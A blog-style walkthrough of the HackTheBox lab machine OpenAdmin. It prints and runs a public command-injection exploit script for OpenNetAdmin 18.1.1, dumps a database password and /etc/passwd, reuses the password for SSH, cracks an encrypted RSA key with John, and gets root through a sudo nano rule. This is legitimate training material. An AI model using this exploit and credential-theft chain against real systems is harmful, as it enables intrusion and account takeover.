---
title: "Walk-through of OpenAdmin from HackTHeBox"
header:
  teaser: /assets/images/2021-07-27-21-12-31.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - OpenNetAdmin
  - 
---

## Machine Information

![openadmin](/assets/images/2021-07-27-21-12-31.png)

OpenAdmin is rated as an easy machine on HackTheBox. Our initial scan finds just two open ports, but further enurmeration with GoBuster is needed before we find our entry point. We discover OpenNetAdmin is running on an old version that we exploit to get a shell. From there we enumerate to find credentials, which let us SSH in as a user. Further enumeration is needed to find an internally accessible website that reveals a private RSA key for another user. Once we access the box as this second user we have a trivial method of escalation to get root.

<!--more-->

Skills required are basic port enumeration and OS exploration knowledge. Skills learned are modifying public exploits and cracking protected RSA keys.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - OpenAdmin](https://www.hackthebox.eu/home/machines/profile/222) |
| Machine Release Date | 4th Jan 2020 |
| Date I Completed It | 27th July 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.171 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~]
└─# nmap -p$ports -sC -sV -oA openadmin 10.10.10.171
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 21:16 BST
Nmap scan report for 10.10.10.171
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds
```

Just two open ports, let's have a look at Apache running on port 80:

![open-apache](/assets/images/2021-07-26-21-22-55.png)

## Gobuster

Just a default Apache installation site. Let's try brute forcing for subfolders using Gobuster:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/26 21:20:03 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.171/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
http://10.10.10.171/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/] 
http://10.10.10.171/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
===============================================================
2021/07/26 21:21:15 Finished
===============================================================
```

We find three subfolders, looking at /artwork first we find some sort of template site with no content:

![open-artwork](/assets/images/2021-07-26-21-28-30.png)

Next we try /sierra which is also a template site with no content:

![open-sierra](/assets/images/2021-07-26-21-30-24.png)

Finally looking at music we have another template:

![open-music](/assets/images/2021-07-26-21-31-52.png)

## OpenNetAdmin Portal

However there's a Menu link top right. Clicking that brings up a list of sections and clicking on Login takes us to an OpenNetAdmin page:

![open-](/assets/images/2021-07-26-21-33-13.png)

We are already logged in as guest. On the left there's a big clue as to our next move:

```text
You are NOT on the latest release version
Your version    = v18.1.1
Latest version = Unable to determine
```

## Searchsploit

We can assume there is an exploit for this old version, let's check searchsploit:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# searchsploit opennetadmin
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                   | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)    | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                     | php/webapps/47691.sh
---------------------------------------------------------------- ---------------------------------
```

We find a remote code execution vulnerability for our version. Let's have a look at it:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# searchsploit -m php/webapps/47691.sh
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
File Type: ASCII text, with CRLF line terminators

Copied to: /root/htb/openadmin/47691.sh

┌──(root💀kali)-[~/htb/openadmin]
└─# more 47691.sh   
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Ok, nice and simple. We just execute the exploit and point it at our vulnerable url:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# ./47691.sh http://10.10.10.171/ona/
47691.sh: line 8: $'\r': command not found
47691.sh: line 16: $'\r': command not found
47691.sh: line 18: $'\r': command not found
47691.sh: line 23: syntax error near unexpected token `done'
47691.sh: line 23: `done'
```

## Initial Shell

We get errors, but if you've used searchsploit a lot you'll know that sometimes what you download doesn't work straight away. First try is to copy the text to a new file in case it's return characters causing a problem:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# ./47691-pencer.sh http://10.10.10.171/ona/
$ 
```

That's better, we now have a semi-interactive shell. Initial enurmeration discovers a config file:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# ./test.sh http://10.10.10.171/ona/
$ pwd
/opt/ona/www

$ ls -l
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r-- 1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r-- 1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x 9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r-- 1 www-data www-data 1999 Jan  3  2018 index.php
lrwxrwxrwx 1 www-data www-data   18 Jul 26 14:26 ld.so.preload -> /etc/ld.so.preload
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r-- 1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r-- 1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 workspace_plugins

$ ls -l config
-rw-rw-r-- 1 www-data www-data 1905 Jan  3  2018 auth_ldap.config.php
-rw-rw-r-- 1 www-data www-data 9983 Jan  3  2018 config.inc.php

$ cat config/config.inc.php
<?php

///////////////////////   WARNING   /////////////////////////////
//           This is the site configuration file.              //
//                                                             //
//      It is not intended that this file be edited.  Any      //
//      user configurations should be in the local config or   //
//      in the database table sys_config                       //
//                                                             //
/////////////////////////////////////////////////////////////////

// Used in PHP for include files and such
// Prefix.. each .php file should have already set $base and $include
// if it is written correctly.  We assume that is the case.
$base;
$include;

$onabase = dirname($base);

//$baseURL = preg_replace('+' . dirname($_SERVER['DOCUMENT_ROOT']) . '+', '', $base);
//$baseURL = preg_replace('+/$+', '', $baseURL);

// Used in URL links
$baseURL=dirname($_SERVER['SCRIPT_NAME']); $baseURL = rtrim($baseURL, '/');
$images = "{$baseURL}/images";

// help URL location
$_ENV['help_url'] = "http://opennetadmin.com/docs/";

<SNIP>

// Include the localized Database settings
$dbconffile = "{$base}/local/config/database_settings.inc.php";
```

Let's have a look at this database settings file:

```text
$ cat local/config/database_settings.inc.php
<?php
$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Interesting. We've found credentials, let's check the users on this server:

```text
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash

$ ls -ls /home
total 8
4 drwxr-x--- 6 jimmy  jimmy  4096 Jul 26 20:34 jimmy
4 drwxr-x--- 6 joanna joanna 4096 Nov 28  2019 joanna
```

## Jimmy SSH Access

I tried the credentials on the admin page of the website but that didn't work. We know there is SSH open on port 22, so let's try the password with the users we've found:

```text
┌──(root💀kali)-[~]
└─# ssh jimmy@10.10.10.171                          
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

  System information as of Mon Jul 26 21:12:23 UTC 2021

Last login: Mon Jul 26 18:09:51 2021 from 10.10.10.171
jimmy@openadmin:~$
```

As expected we found Jimmy has reused the password for his SSH access!

However, we aren't quite there yet, looking in his home folder we don't find a flag:

```text
jimmy@openadmin:~$ ls -ls
total 4
4 -rw-rw-r-- 1 jimmy jimmy 1902 Jul 26 18:15 id_rsa
jimmy@openadmin:~$ 
```

Time to look for files and folders that Jimmy owns. If nothing obvious jumps out we can grab an enumeration script like [LinPEAS:](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

```text
jimmy@openadmin:~$ find / -user jimmy -type d -perm -400 -not -path "/proc/*" 2> /dev/null
/run/user/1000
/run/user/1000/systemd
/run/user/1000/gnupg
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/www/internal
/home/jimmy
/home/jimmy/.local
/home/jimmy/.local/share
/home/jimmy/.local/share/nano
/home/jimmy/.ssh
/home/jimmy/.cache
/home/jimmy/.gnupg
/home/jimmy/.gnupg/private-keys-v1.d
```

First try shows something interesting. Why would Jimmy own a folder called /var/www/internal? Let's have a look:

```text
jimmy@openadmin:~$ ls -ls /var/www/internal
4 -rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
4 -rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
4 -rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Looking at main.php we see there appears to be another website running here and this php file is used to retrieve Joanna's rsa file:

```text
jimmy@openadmin:~$ cat /var/www/internal/main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

A look at the network reveals more ports open internally:

```text
jimmy@openadmin:~$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:52846         0.0.0.0:*               LISTEN     
tcp        0      0 openadmin:ssh           10.10.15.5:33860        ESTABLISHED
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 openadmin:http          10.10.15.5:52450        TIME_WAIT  
udp        0      0 localhost:domain        0.0.0.0:*   
```

Here we see port 52846 is open on localhost. So we can assume we are supposed to access this internal page on that port. Let's try it:

```text
jimmy@openadmin:~$ curl localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
<SNIP>
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

We have the private RSA key for Joanna, but it's encrypted so we'll need to find the password. We can use JohnTheRipper for this, just copy the key to a file and convert to correct format:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# /usr/share/john/ssh2john.py rsa_id > joanna.john

┌──(root💀kali)-[~/htb/openadmin]
└─# cat joanna.john 
rsa_id:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a7
```

## Password Cracking

Now use rockyou wordlist with John to try and crack:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt joanna.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>      (rsa_id)
1g 0:00:00:05 DONE (2021-07-26 22:41) 0.1805g/s 2588Kp/s 2588Kc/s 2588KC/sa6_123..*7¡Vamos!
Session completed
```

## Joanna SSH Access

We have the password, and can now login in via SSH as Joanna:

```text
┌──(root💀kali)-[~/htb/openadmin]
└─# chmod 600 rsa_id

┌──(root💀kali)-[~/htb/openadmin]
└─# ssh -i rsa_id joanna@10.10.10.171
Enter passphrase for key 'rsa_id': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

  System information as of Mon Jul 26 21:48:51 UTC 2021

Last login: Mon Jul 26 18:50:29 2021 from 10.10.14.90
joanna@openadmin:~$
```

## User Flag

Let's grab the user flag:

```text
joanna@openadmin:~$ ls -l
-rw-rw-r-- 1 joanna joanna 33 Nov 28  2019 user.txt

joanna@openadmin:~$ cat user.txt
c<HIDDEN>f
```

## Root Flag

Now we just need to find our way to root. There's a few things I always try before grabbing an enumeration script. First one is check for sudo privileges:

```text
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Well that was simple. A classic nano exploit, seen many time before and noted on [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo). I'll just grab the root flag.

```text
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

With nano open as root we can read the flag in, by pressing CTRL+R and then entering the path to the flag:

![open-root](/assets/images/2021-07-26-22-56-01.png)

All done. See you next time.
